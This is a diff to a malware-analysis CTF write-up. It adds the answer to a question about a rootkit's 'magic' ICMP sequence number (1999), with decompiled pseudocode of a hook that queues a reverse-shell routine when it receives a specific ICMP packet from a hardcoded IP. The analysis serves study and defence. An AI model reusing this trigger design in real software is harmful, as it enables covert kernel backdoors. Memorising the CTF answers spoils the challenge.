@@ -249,7 +249,7 @@ Now byte-swap the value to convert it from network byte order:
 ```text
 0xA146 → Byte Swap → 0x46A1 → Decimal → 18081
 ```
-![Hex to Decimal Conversion](Artifacts/Hex-to-Decimal-Conversion.png)
+![Hex to Decimal Conversion](Artifacts/Malops-CTF-Singularity-Qs7-Hex-to-Decimal-Conversion.png)
 
 **Disassembly View:**
 
@@ -691,6 +691,84 @@ Once the conditions are satisfied, spawn_revshell is queued for execution.
 
 ---
 Qs13. What is the “magic” sequence number that triggers the reverse shell (decimal)?
+
+**Answer:**
+
+```text
+1999
+```
+
+**Findings:**
+
+Finding:
+The hook_icmp_rcv() function compares the ICMP sequence number against the hardcoded value:
+
+**Decompiled Pseudocode:**
+
+```text
+int __fastcall hook_icmp_rcv(sk_buff *skb)
+{
+  unsigned __int8 *head; // rdx
+  __int64 network_header; // rax
+  bool v4; // zf
+  unsigned __int8 *v5; // rax
+  unsigned __int8 *v6; // rbp
+  unsigned __int8 *v8; // r12
+  _QWORD *v9; // rax
+  __int64 v10; // rsi
+  u32 trigger_ip; // [rsp+4h] [rbp-24h] BYREF
+  unsigned __int64 v12; // [rsp+8h] [rbp-20h]
+
+  v12 = __readgsqword(0x28u);
+  trigger_ip = 0;
+  if ( skb != nullptr )
+  {
+    head = skb->head;
+    network_header = skb->network_header;
+    v4 = &head[network_header] == nullptr;
+    v5 = &head[network_header];
+    v6 = v5;
+    if ( !v4 && v5[9] == 1 )
+    {
+      v8 = &head[skb->transport_header];
+      if ( v8 != nullptr
+        && (unsigned int)in4_pton(a1: "192.168.5.128", a2: 0xFFFFFFFFLL, a3: &trigger_ip, a4: 0xFFFFFFFFLL, a5: 0) != 0
+        && *((_DWORD *)v6 + 3) == trigger_ip
+        && *v8 == 8
+        && *((_WORD *)v8 + 3) == 0xCF07 )
+      {
+        v9 = (_QWORD *)_kmalloc_cache_noprof(a1: kmalloc_caches[5], a2: 2080, a3: 32);
+        if ( v9 != nullptr )
+        {
+          v9[3] = spawn_revshell;
+          v10 = system_wq;
+          *v9 = 0xFFFFFFFE00000LL;
+          v9[1] = v9 + 1;
+          v9[2] = v9 + 1;
+          queue_work_on(a1: 0x2000, a2: v10);
+        }
+      }
+    }
+  }
+  return orig_icmp_rcv(a1: skb);
+}
+```
+
+The value appears in IDA as 0xCF07, but ICMP header fields are stored in network byte order (big-endian), we first perform a 16-bit byte swap:
+
+```text
+0xCF07  →  Byte Swap  →  0x07CF
+```
+
+Converting the resulting hexadecimal value to decimal:
+
+```text
+0x07CF  →  Decimal  →  1999
+```
+
+This value is used as one of the conditions required to trigger spawn_revshell().
+
+![Hex to Decimal Conversion](Artifacts/Malops-CTF-Singularity-Qs13-Hex-to-Decimal-Conversion.png)
 
 
 
